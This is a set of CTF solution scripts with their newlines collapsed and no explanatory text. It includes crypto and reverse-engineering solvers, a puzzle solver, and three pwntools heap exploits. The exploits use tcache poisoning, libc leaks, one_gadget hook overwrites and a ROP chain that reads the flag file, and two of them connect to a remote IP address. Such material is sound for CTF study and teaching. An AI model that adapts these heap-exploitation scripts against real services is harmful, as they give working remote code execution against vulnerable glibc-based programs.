n = 80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281e = 67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809c = (6785035174838834841914183175930647480879288136014127270387869708755060512201304812721289604897359441373759673837533885681257952731178067761309151636485456082277426056629351492198510336245951408977207910307892423796711701271285060489337800033465030600312615976587155922834617686938658973507383512257481837605, 38233052047321946362283579951524857528047793820071079629483638995357740390030253046483152584725740787856777849310333417930989050087087487329435299064039690255526263003473139694460808679743076963542716855777569123353687450350073011620347635639646034793626760244748027610309830233139635078417444771674354527028)x = -26279444166664821795077701675621823220865336004430428203703688888211697122228y = -22131877391133483964429946329193825460775374851078084751208971056041193500203
k = e*x-n*yK = k//ydef factor(K,N): l = 0 r = K for i in range(518): s = (l+r)//2 v = s*s - (9*s*s*(K-1-s)*(K-1-s)//(round(N**0.25)*round(N**0.25))) if v < 4*N: l = s else : r = s return rS = factor(K,n)d = inverse(e,n+1+S)print(d)
def add(p1, p2): if p1 == (0, 0): return p2 if p2 == (0, 0): return p1 if p1[0] == p2[0] and (p1[1] != p2[1] or p1[1] == 0): return (0, 0) if p1[0] == p2[0]: tmp = (3 * p1[0] * p1[0]) * inverse(2 * p1[1], n) % n else: tmp = (p2[1] - p1[1]) * inverse(p2[0] - p1[0], n) % n x = (tmp * tmp - p1[0] - p2[0]) % n y = (tmp * (p1[0] - x) - p1[1]) % n return (int(x), int(y))

def mul(n, p): r = (0, 0) tmp = p while 0 < n: if n & 1 == 1: r = add(r, tmp) n, tmp = n >> 1, add(tmp, tmp) return rm = mul(d,c)print(long_to_bytes(m[0])+long_to_bytes(m[1]))"""sage"""n = 80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281e = 67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809M = matrix(ZZ,[[2**512,e],[0,-n]])GV = M.LLL()[0]x = GV[0]>>512y=(e*x-GV[1])//nprint(x)print(y)
```



```
from math import ceil, floorimport numpy as npimport matplotlib.pyplot as pltimport md5
list1 = [205, 237, 6, 158, 24, 119, 213, 32, 74, 151, 142, 186, 57, 28, 113, 62, 165, 20, 190, 37, 159, 137, 196, 44, 97, 37, 7, 222, 220, 95, 4, 66, 0, 28, 199, 142, 95, 105, 119, 232, 250, 215, 60, 162, 91, 211, 63, 30, 91, 108, 217, 206, 80, 193, 230, 42, 221, 71, 136, 115, 22, 176, 91, 57, 61, 3, 87, 73, 250, 121, 51, 72, 83, 120, 77, 199, 236, 190, 249, 116, 45, 6, 134, 110, 149, 94, 214, 232, 153, 213, 119, 98, 81, 203, 240, 114, 240, 29, 122, 188, 156, 53, 128, 185, 40, 147, 245, 204, 47, 101, 80, 229, 41, 150, 28, 195, 25, 235, 119, 6, 192, 8, 73, 255, 159, 172, 77, 94, 254, 104, 236, 219, 141, 91, 195, 162, 97, 56, 252, 173, 163, 43, 167, 214, 50, 73, 115, 190, 254, 53, 61, 77, 138, 192, 15, 4, 190, 27, 37, 108, 101, 135, 90, 215, 106, 243, 112, 111, 106, 89, 143, 150, 185, 142, 192, 176, 48, 138, 164, 185, 61, 77, 72, 0, 17, 203, 210, 71, 186, 49, 162, 250, 218, 219, 195, 63, 248, 220, 155, 180, 219, 132, 219, 94, 144, 247, 211, 95, 70, 227, 222, 31, 69, 24, 13, 216, 185, 108, 137, 57, 186, 211, 55, 27, 158, 241, 223, 21, 134, 106, 152, 127, 187, 245, 246, 131, 176, 177, 228, 100, 112, 11, 84, 61, 193, 42, 41, 69, 229, 145, 254, 138, 3, 153, 123, 31]list2 = [131, 92, 72, 47, 177, 57, 131, 118, 4, 38, 192, 19, 119, 82, 63, 143, 235, 165, 15, 140, 209, 223, 117, 133, 47, 148, 81, 144, 138, 246, 173, 235, 177, 181, 110, 39, 9, 192, 57, 166, 180, 153, 141, 19, 234, 157, 142, 80, 234, 197, 151, 152, 249, 143, 176, 155, 147, 17, 57, 194, 191, 254, 13, 144, 140, 85, 25, 248, 172, 208, 154, 249, 5, 201, 27, 137, 69, 23, 175, 34, 156, 72, 208, 32, 195, 16, 127, 65, 207, 131, 57, 203, 7, 98, 89, 36, 65, 75, 211, 21, 45, 132, 214, 239, 102, 58, 68, 130, 97, 204, 225, 76, 152, 216, 74, 149, 79, 165, 198, 72, 150, 94, 7, 177, 46, 226, 252, 247, 79, 62, 69, 106, 60, 21, 106, 236, 47, 145, 170, 28, 18, 101, 14, 152, 131, 7, 37, 15, 168, 99, 115, 27, 220, 150, 89, 82, 232, 170, 107, 221, 212, 46, 235, 129, 36, 66, 217, 222, 36, 15, 217, 192, 247, 192, 113, 230, 129, 196, 13, 247, 148, 228, 225, 86, 71, 133, 132, 238, 236, 127, 11, 83, 107, 141, 114, 150, 182, 146, 213, 250, 141, 53, 114, 16, 198, 70, 133, 17, 247, 173, 136, 73, 236, 78, 188, 150, 239, 58, 199, 136, 11, 122, 134, 77, 47, 167, 137, 188, 55, 195, 41, 49, 245, 92, 160, 213, 254, 0, 85, 205, 193, 69, 2, 140, 143, 155, 127, 236, 179, 199, 168, 35, 85, 40, 45, 174]list3 = [198, 143, 247, 3, 152, 139, 131, 84, 181, 180, 252, 177, 192, 25, 217, 179, 136, 107, 190, 62, 4, 6, 90, 53, 105, 238, 117, 44, 5, 116, 132, 195, 214, 171, 113, 209, 18, 31, 194, 174, 228, 212, 196, 14, 27, 41, 211, 56, 139, 135, 225, 214, 89, 122, 178, 212, 185, 231, 204, 150, 204, 212, 160, 142, 213, 173, 186, 166, 65, 238, 5, 32, 45, 31, 25, 189, 148, 38, 78, 79, 33, 56, 227, 48, 103, 163, 31, 189, 37, 124, 106, 249, 86, 188, 86, 233, 41, 250, 89, 7, 212, 234, 111, 104, 245, 102, 227, 96, 160, 67, 181, 13, 26, 192, 214, 210, 188, 84, 216, 215, 243, 72, 233, 2, 122, 166, 107, 251, 70, 128, 94, 190, 185, 210, 34, 85, 77, 29, 182, 77, 115, 208, 228, 252, 73, 198, 151, 70, 10, 97, 138, 235, 21, 117, 239, 102, 129, 2, 253, 80, 53, 61, 184, 220, 41, 82, 37, 140, 23, 143, 179, 53, 153, 113, 213, 211, 111, 197, 248, 65, 60, 69, 1, 81, 48, 254, 251, 89, 195, 8, 93, 190, 66, 174, 97, 175, 210, 191, 66, 112, 123, 128, 33, 230, 237, 104, 16, 192, 239, 173, 44, 10, 120, 231, 114, 151, 140, 63, 103, 44, 243, 222, 242, 73, 51, 46, 98, 137, 163, 152, 147, 95, 223, 3, 15, 112, 85, 215, 133, 131, 240, 239, 224, 195, 140, 124, 70, 156, 221, 241, 37, 245, 1, 99, 9, 157, 99, 150, 47, 118, 225, 16, 13, 141, 135, 99, 18, 119, 63, 160, 6, 247, 27, 68, 45, 199, 86, 193, 252, 21, 135, 32, 42, 103, 114, 241, 49, 249, 182, 52, 18, 155, 157, 61, 4, 246, 158, 52, 118, 242, 195, 54, 139, 232, 100, 31, 11, 233, 58, 100, 101, 137, 83, 145, 209, 7, 241, 96, 57, 148, 207, 29, 237, 124, 177, 166, 161, 20, 116, 122, 61, 71, 46, 82, 18, 157, 253, 130, 112, 66, 94, 57, 221, 243, 222, 192, 147, 5, 130, 201, 174, 26, 160, 16, 188, 103, 187, 11, 238, 182, 144, 4, 137, 33, 84, 100, 7, 239, 219, 83, 112, 189, 166, 58, 93, 141, 30, 198, 220, 196, 118, 172, 5, 45]
def gen(x,r): return round(r*x*(3-x),6)
def check_x0_r(b,r,lis): b = round(b,6) r = round(r,1) for i in range(len(lis)): b = gen(b,r) if int(b*22000) != lis[i]: return False return True
def get_r(lis): r = 0 for i in range(len(lis)-1): r += lis[i+1]/(lis[i]*(3-lis[i])) return r/(len(lis)-1)
def check(key1,key2): global list1,list2 chs = [] for i in range(len(list1)): if (list1[i]^key1)&0xff == list2[i]: chs.append(0) continue if (~list1[i]^key1)&0xff == list2[i]: chs.append(1) continue if (list1[i]^key2)&0xff == list2[i]: chs.append(2) continue if (~list1[i]^key2)&0xff == list2[i]: chs.append(3) continue return False ixlist = [] x = 0 for i in range(len(chs)): x = x*4+chs[i] if i%8==7: ixlist.append(x) x = 0 tlist = [x/22000 for x in ixlist] x1 = [] y1 = [] for i in range(len(tlist)-1): y1.append(tlist[i+1]) x1.append(tlist[i]) # # print(get_r(tlist)) r = get_r(tlist) print(r) # for i in range(1000000): # x0 = i/1000000 # if check_x0_r(x0,r,ixlist): # print(x0) xx = np.array(x1) yy = np.array(y1) plot1 = plt.plot(xx, yy, 's',label='original values') plt.show() return True
for key1 in range(256): for key2 in range(256): if check(key1,key2): print(key1,key2)

def check123(key1,key2): global list1,list2 chs = [] for i in range(len(list1)): if (list1[i]^key1)&0xff == list2[i]: chs.append(0) continue if (~list1[i]^key1)&0xff == list2[i]: chs.append(1) continue if (list1[i]^key2)&0xff == list2[i]: chs.append(2) continue if (~list1[i]^key2)&0xff == list2[i]: chs.append(3) continue ixlist = [] x = 0 for i in range(len(chs)): x = x*4+chs[i] if i%8==7: ixlist.append(x) x = 0 # r = get_r(ixlist) r = 1.2 for i in range(1000000): x0 = i/1000000 if check_x0_r(x0,r,ixlist): print(x0)
key1,key2 = 169,78# check123(key1,key2)
r = 1.2x0 = 0.840264
def generate(x): return round(r*x*(3-x),6)
def encrypt(pixel,key1,key2,x0,m,n): num = int(m*n/8) seqs = [] x = x0 bins = '' tmp = [] for i in range(num): x = generate(x) tmp.append(x) seqs.append(int(x*22000)) for x in seqs: bin_x = bin(x)[2:] if len(bin_x) < 16: bin_x = '0'*(16-len(bin_x))+bin_x bins += bin_x assert(len(pixel) == m*n) cipher = [ 0 for i in range(m) for j in range(n)] for i in range(m): for j in range(n): index = n*i+j ch = int(bins[2*index:2*index+2],2) pix = pixel[index] if ch == 0: pix = (pix^key1)&0xff if ch == 1: pix = (~pix^key1)&0xff if ch == 2: pix = (pix^key2)&0xff if ch == 3: pix = (~pix^key2)&0xff cipher[index] = pix return cipher
def decrypt(pixel,key1,key2,x0,m,n): num = int(m*n/8) seqs = [] x = x0 bins = '' tmp = [] for i in range(num): x = generate(x) tmp.append(x) seqs.append(int(x*22000)) for x in seqs: bin_x = bin(x)[2:] if len(bin_x) < 16: bin_x = '0'*(16-len(bin_x))+bin_x bins += bin_x assert(len(pixel) == m*n) cipher = [ 0 for i in range(m) for j in range(n)] for i in range(m): for j in range(n): index = n*i+j ch = int(bins[2*index:2*index+2],2) pix = pixel[index] if ch == 0: pix = (pix^key1)&0xff if ch == 1: pix = (~(pix^key1))&0xff if ch == 2: pix = (pix^key2)&0xff if ch == 3: pix = (~(pix^key2))&0xff cipher[index] = pix return cipher
image = encrypt(list3,key1,key2,x0,24,16)print(image)data = ''.join(map(chr,image))print(md5.new(data).hexdigest())
```



```
#coding=utf-8from pwn import *context.log_level='debug'7
def choose(choice): p.recvuntil('Your choice: ') p.sendline(str(choice))def allocate(index,size): choose(1) p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Size: ') p.sendline(str(size))
def edit(index,content): choose(2) p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Content: ') p.sendline(str(content))
def show(index): choose(3) p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Content: ') leak_addr=u64(p.recv(6).ljust(8,'x00')) return leak_addr
def delete(index): choose(4) p.recvuntil('Index: ') p.sendline(str(index))
p=process('./lonelywolf')libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')allocate(0,0x78)for i in range(7): #free(): double free detected in tcache 2 edit(0,0x10*'a') delete(0)heap_leak_addr=show(0)print heap_leak_addrprint type(heap_leak_addr)heap_base=heap_leak_addr-0x260print hex(heap_base) #tcache_full
edit(0,p64(heap_base+0x10))allocate(0,0x78)allocate(0,0x78)edit(0,p64(0)*2) #tcache
allocate(0,0x58) #start 0x5555557572d0edit(0,p64(0)+p64(0x511)) #fake_mchunk_sizeallocate(0,0x58) #start 0x555555757330allocate(0,0x58)allocate(0,0x58)allocate(0,0x58)allocate(0,0x58)allocate(0,0x58)allocate(0,0x58)allocate(0,0x58)allocate(0,0x58)allocate(0,0x58)allocate(0,0x58)allocate(0,0x58)allocate(0,0x58)edit(0,p64(0)*6+p64(0)+p64(0x31)) #fake_mchunk_nextsize #0x5555557577f0allocate(0,0x58) #avoid top chunkedit(0,p64(0)+p64(0x31))allocate(0,0x38)for i in range(6): #free(): double free detected in tcache 2 edit(0,0x10*'b') delete(0)edit(0,p64(heap_base-0xfb0))allocate(0,0x38)allocate(0,0x38)edit(0,p64(0)+p64(heap_base+0x2f0)) #x/16gx $rebase(0x202050)#gdb.attach(p,'dir /home/ubuntu/Desktop/malloc/glibc/glibc-2.27/malloc/n'+'b malloc.c:4328')
delete(0)#gdb.attach(p,'dir /home/ubuntu/Desktop/malloc/glibc/glibc-2.27/malloc/n'+'b malloc.c:4328')main_arena_addr=show(0)print hex(main_arena_addr)libc_base=main_arena_addr-0x60-0x3ebc40print hex(libc_base)__malloc_hook=libc_base+libc.symbols['__malloc_hook']print hex(__malloc_hook)allocate(0,0x21)delete(0)edit(0,p64(__malloc_hook))allocate(0,0x21)allocate(0,0x21)one_gadget=[0x4f3d5,0x4f432,0x10a41c]real_one_gadget=libc_base+one_gadget[2]edit(0,p64(real_one_gadget))allocate(0,0x10)#gdb.attach(p)p.interactive()
```



```
#coding:utf-8from pwn import *context.log_level = 'debug'p = ''def out(idx): p.sendlineafter(':', '1') p.sendafter('x:', str(idx))def _in(idx, content): p.sendlineafter(':', '2') p.sendlineafter(':', str(idx)) p.send(str(content))def overflow_fd(): for i in range(2): p.sendlineafter(':', '2') p.sendlineafter(':', '256')def exp(): global p elf = ELF('./pwny') # libc = elf.libc libc = ELF('./libc-2.27.so') # p = process('./pwny') p = remote('124.71.226.90', 23751) overflow_fd() out(p64(0x10000000000000000 - 25)) p.recvuntil('Result: ') libc_base = int('0x'+p.recvuntil('n', drop=True), 16) - libc.sym['puts'] log.info(hex(libc_base)) system = libc_base + libc.sym['system'] sh = libc_base + libc.search('/bin/sh').next() out(p64(0x10000000000000000 - 75)) p.recvuntil('Result: ') elf_base = int('0x'+p.recvuntil('n', drop=True), 16) - (0x564874398298 - 0x564874398000) log.info(hex(elf_base)) environ = libc_base + libc.sym['_environ'] one_gadget = libc_base + 0x10a41c # # one_gadget = libc_base + 0x10a45c start = elf_base + 0x202060 out(p64((environ - start)//8)) p.recvuntil('Result: ') stack = int('0x'+p.recvuntil('n', drop=True), 16) log.info(hex(stack)) write = stack - 0x120 # gdb.attach(p,'b*$rebase(0xC06)') _in((write - start)//8, p64(one_gadget)) p.interactive()if __name__ == '__main__': exp()
```



```
#coding:utf-8from pwn import *context.log_level = 'info'def allocate(size): p.sendlineafter(':', str(1)) p.sendlineafter(':', str(0)) p.sendlineafter(':', str(size))def edit(content): p.sendlineafter(':', str(2)) p.sendlineafter(':', str(0)) p.sendafter(':', str(content))def show(): p.sendlineafter(':', str(3)) p.sendlineafter(':', str(0))def delete(): p.sendlineafter(':', str(4)) p.sendlineafter(':', str(0))def exit(): p.sendlineafter(':', str(5))p = ''free = 0xEA9edit_read = 0x0102Bmalloc = 0xDF1'''0x20 -> 70x60 -> 10x70 -> 70x80 -> 70xd0 -> 30xf0 -> 2'''def exp(): global p elf = ELF('./silverwolf') libc = ELF('./libc-2.27.so') # p = process('./silverwolf', env={"LD_PRELOAD":"./libc-2.27.so"}) p = remote('124.71.226.90', 23694) for i in range(20): allocate(0x10) allocate(0x50) for i in range(7): allocate(0x60) for i in range(7): allocate(0x70) allocate(0x20) delete() allocate(0x50) allocate(0x9) delete() edit('1'*8+'n') delete() allocate(0x2) edit(p16(0x7010+0x40)) allocate(0x2) allocate(0x2) # show() p.recvuntil(': ') heap_base = u64(p.recv(6).ljust(8,'x00')) - 0x50 log.info(hex(heap_base)) if heap_base < 0x500: raise EOFError allocate(0x30) delete() edit('1'*8+'n') delete() allocate(0x30) edit(p64(heap_base+0x19d0)+'n') allocate(0x30) allocate(0x30) # point to 0x20 chunk edit(p64(0)+p64(0x91)[:-1]+'n') allocate(0x70) delete() edit('1'*8+'n') delete() allocate(0x70) edit(p64(heap_base+0x10)+'n') allocate(0x70) allocate(0x70) edit(('x01'*2+'x00'*5+'xff').ljust(0x40, 'xff')+p64(heap_base+0x50)+p64(heap_base+0x19d0+0x10)+'n') allocate(0x20) # 0x30 0x60 0x20 0x40 0x80 delete() show() libc_base = u64(p.recvuntil('x7f')[-6:].ljust(8,'x00')) - (0x7ffff7dcfca0-0x7ffff79e4000) log.info(hex(libc_base)) free_hook = libc_base + libc.sym['__free_hook'] system = libc_base + libc.sym['system'] environ = libc_base + libc.sym['_environ'] allocate(0x40) delete() edit('1'*8+'n') delete() allocate(0x40) edit(p64(environ)+'n') allocate(0x40) edit('./flagn') allocate(0x40) show() p.recvuntil(': ') stack = u64(p.recv(6).ljust(8,'x00')) log.info(hex(stack)) ret = stack - (0x7fffffffee58-0x7fffffffed38) allocate(0x60) # 0x30 0x60 0x20 0x40 0x80 0x50 0x70 delete() edit('1'*8+'n') delete() allocate(0x60) edit(p64(heap_base+0x40+0x10)+'n') allocate(0x60) pop_rdi_ret = 0x00000000000215bf + libc_base pop_rdx_rsi_ret = 0x0000000000130569 + libc_base pop_rsi_ret = 0x0000000000023eea + libc_base pop_rax_ret = 0x0000000000043ae8 + libc_base pop_4_ret = 0x00000000000215b8 + libc_base pop_rsp_ret = 0x0000000000003960 + libc_base syscall = libc_base + 0x110222 read = libc_base + libc.sym['read'] write = libc_base + libc.sym['write'] allocate(0x60) # point to tcache target = heap_base + 0x1f0 flag = heap_base + 0x19e0 payload = p64(ret) + p64(target+0x10) + p64(target + 0x20) + p64(target+0x40) + p64(target + 0x70) edit(payload+'n') # gdb.attach(p,'b*$rebase({})'.format(malloc)) ROP = '' ROP += p64(pop_rax_ret)+p64(2) ROP += p64(pop_rdi_ret)+p64(flag) ROP += p64(pop_rsi_ret)+p64(0) + p64(syscall) ROP += p64(pop_rdi_ret)+p64(3) ROP += p64(pop_rdx_rsi_ret)+p64(0x50)+p64(heap_base) ROP += p64(read) ROP += p64(pop_rdi_ret)+p64(1) ROP += p64(write) allocate(0x20) # 0x10 payload = ROP[0:0x10] + p64(pop_4_ret) edit(payload+'n') allocate(0x30) # 0x20 payload = ROP[0x10:0x30] + p64(pop_4_ret) edit(payload + 'n') allocate(0x40) # 0x30 payload = ROP[0x30:0x60] + p64(pop_4_ret) edit(payload+'n') allocate(0x50) # 0x40 payload = ROP[0x60:] + p64(pop_4_ret) edit(payload+'n') # gdb.attach(p,'b*$rebase({})'.format(0x1050)) allocate(0x10) edit(p64(pop_rsp_ret)+p64(target+0x10)) p.interactive()
if __name__ == '__main__': i = 0 while True: try: print('+============================ {} ++==========================='.format(i)) exp() except: p.close() finally: i += 1 # exp(
```



```
check = [0xA3, 0x1A, 0xE3, 0x69, 0x2F, 0xBB, 0x1A, 0x84, 0x65, 0xC2, 0xAD, 0xAD, 0x9E, 0x96, 0x05, 0x02, 0x1F, 0x8E, 0x36, 0x4F, 0xE1, 0xEB, 0xAF, 0xF0, 0xEA, 0xC4, 0xA8, 0x2D, 0x42, 0xC7, 0x6E, 0x3F, 0xB0, 0xD3, 0xCC, 0x78, 0xF9, 0x98, 0x3F]
for i in range(39): t = list(map(ord,list("12345678"))) check[i] ^= t[i % 8]

i = 0while i < 39: a1, a2, a3 = check[i: i+3] b2 = a1^a2 b3 = a3^b2 b1 = a1^b3 check[i: i+3] = [b1, b2, b3] i+=3
a_check = check

encoder = [0x65, 0x5e, 0x99, 0x75, 0x37, 0x44, 0x81, 0xc0, 0x78, 0xa3, 0xf4, 0xa7, 0x83, 0x6a, 0x85, 0xbb, 0xfc, 0x3f, 0x89, 0x7f, 0x14, 0xe2, 0x36, 0xc4, 0x5, 0x61, 0xdc, 0x2b, 0x7c, 0x67, 0xdd, 0x21, 0xda, 0x7b, 0x68, 0x13, 0x28, 0x3c, 0x43, 0x70, 0x9d, 0xe9, 0x46, 0xe8, 0x88, 0x53, 0x8a, 0xdb, 0x1, 0x96, 0xc9, 0x5a, 0xef, 0x8e, 0xd4, 0xc8, 0x6d, 0xd8, 0x38, 0xb4, 0x4e, 0xbd, 0x34, 0x56, 0xc7, 0xd5, 0xaf, 0xb2, 0x50, 0xe3, 0x30, 0x58, 0x79, 0xb, 0xbc, 0x54, 0x52, 0x49, 0x91, 0x47, 0x2a, 0xe6, 0x4a, 0x12, 0x2c, 0xf0, 0xd0, 0x2e, 0x6e, 0xf, 0x62, 0xc2, 0xb3, 0xde, 0xb1, 0x1f, 0x40, 0xe4, 0x39, 0x8b, 0x73, 0x63, 0x7e, 0xcf, 0x80, 0xe0, 0xad, 0x8d, 0xed, 0x2d, 0xdf, 0x72, 0x35, 0xca, 0x86, 0x87, 0xc3, 0x19, 0xb0, 0x9e, 0xf9, 0x77, 0xec, 0xfa, 0x76, 0xa, 0x31, 0x4d, 0xcd, 0xa0, 0xe7, 0xf7, 0xd3, 0xce, 0x3b, 0x0, 0xf6, 0x55, 0xa4, 0xd7, 0x24, 0xc5, 0x8c, 0xd, 0xa9, 0x8, 0x57, 0x74, 0x48, 0xba, 0xf1, 0x15, 0xbe, 0xa5, 0x11, 0xb8, 0x1d, 0xa2, 0x3, 0x94, 0x93, 0xd1, 0x27, 0xff, 0x92, 0xae, 0xd2, 0x1a, 0xb5, 0x1b, 0x41, 0x16, 0xf2, 0xb9, 0x6f, 0x3d, 0xc1, 0x18, 0x5d, 0x5b, 0x23, 0xc6, 0xe, 0xd9, 0x6b, 0x9c, 0xac, 0xa6, 0x33, 0x97, 0x9b, 0xf5, 0x98, 0x25, 0xfe, 0x1e, 0xfb, 0x4b, 0x7a, 0x4, 0x9, 0x17, 0x26, 0x51, 0xe1, 0xb6, 0x71, 0xee, 0x7, 0x22, 0xfd, 0xf3, 0x90, 0x45, 0x29, 0xf8, 0x2, 0xcb, 0xcc, 0x9a, 0xab, 0x4f, 0xd6, 0xa1, 0x60, 0x32, 0x5f, 0xa8, 0x8f, 0x4c, 0x69, 0x84, 0x95, 0x6, 0xeb, 0x2f, 0xb7, 0x20, 0x3e, 0xe5, 0x82, 0xbf, 0xc, 0x59, 0x10, 0x64, 0x5c, 0x3a, 0x7d, 0x9f, 0x1c, 0x66, 0x6c, 0xaa, 0x42, 0xea]def dec_input(encoder, secret): v3 = 0 v4 = 0 j = 0 for _ in range(39): v4 = (v4 + 1) % 256 v5 = encoder[v4] v3 = (v3 + v5) % 256; encoder[v4] = encoder[v3] encoder[v3] = v5 secret[j] ^= encoder[(v5 + encoder[v4]) % 256] j += 1
dec_input(encoder, a_check)

for i in a_check: print(chr(i), end='')
```



```
#include<iostream>using namespace std;bool row[5][6]={false};bool line[5][6]={false};int map[5][5]={0};inline void trace(int &x,int &y){ y++; if(y>=5) { x++; y=0; }
}bool check(){ if(map[2][2]!=4 || map[3][3]!=3) return false; if(map[0][3]<map[0][4] || map[1][0]<map[1][1] || map[2][0]>map[2][1] || map[2][3]<map[2][4] || map[4][0]<map[4][1] || map[4][2]<map[4][3] || map[0][2]<map[1][2] || map[0][4]<map[1][4] || map[2][3]>map[3][3] || map[3][1]>map[4][1] || map[3][4]>map[4][4]) return false; return true;}void dfs(int x,int y){ if(x>=5) { if(check()) { printf("great!n"); for(int i=0;i<5;i++,puts("")) for(int j=0;j<5;j++) printf("%d ",map[i][j]); } return; } for(int i=1;i<=5;i++) { if(!line[x][i] && !row[y][i]) { line[x][i]=row[y][i]=true; map[x][y]=i; int tx=x,ty=y; trace(tx,ty); dfs(tx,ty); map[x][y]=0; line[x][i]=row[y][i]=false; } }}int main(){ dfs(0,0);}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/0-1634877706.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/7-1634877706.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/7-1634877707.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/7-1634877707-1.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/6-1634877707.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/0-1634877707.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/8-1634877707.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/0-1634877708.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/3-1634877708.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/10-1634877709.png)